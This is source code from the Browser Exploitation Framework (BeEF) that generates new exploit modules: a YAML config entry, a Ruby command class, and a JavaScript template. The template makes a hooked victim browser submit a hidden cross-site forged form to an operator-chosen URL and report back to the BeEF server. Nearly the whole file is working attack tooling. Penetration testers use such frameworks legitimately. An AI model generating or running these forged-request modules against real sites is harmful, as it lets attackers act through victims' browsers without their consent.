#
# @note Module configuration file 'config.yaml'
#
class ConfigFile
  def generate(class_name)
    return <<-EOF
#
# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
beef:
    module:
        #{class_name}:
            enable: true
            category: "Exploits"
            name: "#{class_name.capitalize}"
            description: "#{class_name.capitalize}"
            authors: ["BeEF"]
            target:
                unknown: ["ALL"]
    EOF
  end
end

#
# @note Module class file 'module.rb'
#
class ModuleFile
  def generate(class_name, target_url, options)
    options_rb = ""
    options.to_enum.with_index(1).each do |input, input_index|
      options_rb += "      { 'name' => 'input_#{input_index}', 'ui_label' => %q(#{input[0]}), 'value' => %q(#{input[1]}) },\n"
    end
    return <<-EOF
#
# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class #{class_name.capitalize} < BeEF::Core::Command

  def self.options
    return [
      { 'name' => 'target_url', 'ui_label' => 'Target URL', 'value' => %q(#{target_url}) },
#{options_rb.chomp}
    ]
  end

  def post_execute
    save({'result' => @datastore['result']})
  end

end
    EOF
  end
end

#
# @note Module javascript command file 'command.js'
#
class CommandFile
  def generate(class_name, method, enctype, options)
    options_js = ""
    options.to_enum.with_index(1).each do |input, input_index|
      options_js += "        {'type':'hidden', 'name':'#{input.first.to_s.gsub(/'/, "\\'")}', 'value':'<%= CGI.escape(@input_#{input_index}) %>' },\n"
    end
    return <<-EOF
//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  var target_url = '<%= @target_url.to_s.gsub(/'/, "\\\\'") %>'; 
  var timeout = 15;

  exploit = function() {
    var #{class_name}_iframe_<%= @command_id %> = beef.dom.createIframeXsrfForm(target_url, '#{method.to_s.gsub(/'/, "\\'")}', '#{enctype.to_s.gsub(/'/, "\\'")}',
      [
#{options_js.chomp}
      ]);

    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");
  }

  cleanup = function() {
    try {
      document.body.removeChild(#{class_name}_iframe_<%= @command_id %>);
    } catch(e) {
      beef.debug("Could not remove iframe: " + e.message);
    }
  }
  setTimeout("cleanup()", timeout*1000);

  try {
    exploit();
  } catch(e) {
    beef.debug("Exploit failed: " + e.message);
  }

});
    EOF
  end
end

